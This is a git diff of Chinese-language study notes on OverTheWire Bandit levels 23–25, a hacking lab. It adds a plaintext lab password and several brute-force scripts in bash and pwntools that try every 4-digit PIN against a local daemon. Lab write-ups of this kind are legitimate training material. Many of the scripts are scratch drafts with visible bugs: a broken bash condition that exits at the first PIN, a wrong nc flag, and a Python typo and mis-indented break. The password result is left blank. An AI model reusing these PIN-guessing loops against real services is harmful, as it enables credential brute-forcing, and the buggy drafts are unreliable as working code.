@@ -795,7 +795,7 @@ ssh
   
   - cat cronjob_bandit24
   
-  -  cat  /usr/bin/cronjob_bandit24.sh
+  - cat  /usr/bin/cronjob_bandit24.sh
     
     - ```bash
       #!/bin/bash
@@ -806,15 +806,15 @@ ssh
       echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
       for i in * .*;
       do
-          if [ "$i" != "." -a "$i" != ".." ];
-          then
-              echo "Handling $i"
-              owner="$(stat --format "%U" ./$i)"
-              if [ "${owner}" = "bandit23" ]; then
-                  timeout -s 9 60 ./$i
-              fi
-              rm -f ./$i
-          fi
+         if [ "$i" != "." -a "$i" != ".." ];
+         then
+             echo "Handling $i"
+             owner="$(stat --format "%U" ./$i)"
+             if [ "${owner}" = "bandit23" ]; then
+                 timeout -s 9 60 ./$i
+             fi
+             rm -f ./$i
+         fi
       done
       ```
     
@@ -834,6 +834,148 @@ ssh
   - cp shell.sh /var/spool/bandit24/foo/
   
   - 获得密码：VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+## lv24-25
+
+- 目标：
+  
+  - A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
+    You do not need to create new connections each time
+
+- 命令学习：
+  
+  - nc
+    
+    - nc 参数 域名或IP地址  
+      原文链接：[nc命令 &#8211; 扫描与连接指定端口 &#8211; Linux命令大全(手册)](https://www.linuxcool.com/nc)
+
+- 解题步骤：
+  
+  - ssh -p 2220 bandit24@bandit.labs.overthewire.org VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+  
+  - mkdir /tmp/bandit24tmp
+  
+  - cd /tmp/bandit24tmp
+  
+  - vim shell.sh
+    
+    - ```vim
+      for ((i=1000;i<10000;i++));do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> pingcode.txt;done
+      
+      ### nc localhost -p 30002 < pingcode.txt
+      
+      cat ./pingcode.txt | nc localhost -p 30002 >> ./bandit24pass
+      echo -e ./pingcode.txt | nc localhost -p 30002 >> ./bandit24pass
+      echo -e "$BANDIT24_PASS $PIN" | nc localhost 30002 >> ./bandit242pass
+      
+      #!/bin/bash  
+      
+      # 假设你已经有了bandit24的密码  
+      BANDIT24_PASS="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"  
+      
+      # 尝试从0000到9999的所有PIN码  
+      for PIN in {0000..9999}  
+      do  
+          # 使用netcat与守护进程通信  
+          # 注意：这取决于守护进程的具体行为，可能需要调整  
+          RESPONSE=$(echo -e "$BANDIT24_PASS $PIN" | nc localhost 30002)  
+      
+          # 检查响应中是否包含"correct"或类似的消息  
+          if [[ $RESPONSE == *"orrect"* ]]; then  
+              echo "Found the PIN: $PIN"  
+              echo "The response from the daemon is: $RESPONSE"  
+              # 这里可以添加逻辑来提取并打印bandit25的密码（如果它在响应中）  
+              break  # 退出循环  
+          fi  
+      done
+      
+      
+      
+      
+      from pwn import *
+      
+      conn = remote('localhost', '30002')
+      badline = conn.recvline()
+      for i in range(10000):
+          tmp = str(i).zfill(4)
+          print ('[+] Trying pincode: ' + str(tmp))
+          conn.sendline('VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ' + tmp)
+          response = conn.recvline()
+          print(response)
+          if b'Wrong! Please enter the correct pincode. Try again.' not in response:
+              print('[+] Found pincode: ' + str(tmp))
+               break
+      
+      
+       for i in {0000..9999};do echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i;done | nc localhost 30002
+      
+      
+      
+      
+      #!/bin/bash  
+      
+      # 假设你已经有了bandit24的密码  
+      BANDIT24_PASS="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"  
+      
+      # 尝试从0000到9999的所有PIN码  
+      for PIN in {0000..9999}  
+      do  
+          # 使用netcat与守护进程通信  
+          # 注意：这取决于守护进程的具体行为，可能需要调整  
+          RESPONSE=$(echo "$BANDIT24_PASS $PIN" | nc localhost 30002)  
+      
+          # 检查响应中是否包含"correct"或类似的消息  
+          if [[ $RESPONSE == *"orrect"* || $PIN%500 == 0]]; then  
+              echo "Found the PIN: $PIN"  
+              echo "The response from the daemon is: $RESPONSE"
+              sleep 2  
+              # 这里可以添加逻辑来提取并打印bandit25的密码（如果它在响应中）  
+              break  # 退出循环  
+          fi  
+      done
+      
+      
+      
+      
+      echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000 | nc localhost 30002
+      printf VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 0000 | nc localhost 30002
+      
+      
+      str="Hello, abc is here."  
+      if [[ "$str" =~ abc ]]; then  
+          echo "String contains 'abc'."  
+      else  
+          echo "String does not contain 'abc'."  
+      fi
+      
+      
+      str="Hello, abc is here."  
+      if echo "$str" | grep -q "abc"; then  
+          echo "String contains 'abc'."  
+      else  
+          echo "String does not contain 'abc'."  
+      fi
+      ```
+
+      from pwn import *
+    
+      r = remote('localhost', 30002)
+      for i in range(0, 10):
+          for j in range(0, 10):
+              for k in range(0, 10):
+                  for p in range(0, 10):
+                      flag = str(i) + str(j) + str(k) + str(p)
+                      s = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar "+ flag
+                      r.sendline(s)
+                      response = r.recvline()
+                      if 'Wrong!' not in response:
+                          print 'Correct! ' + responsee
+    
+      ```
+
+- ./shell.sh
+
+- 获得密码：
 
 # 模板
 
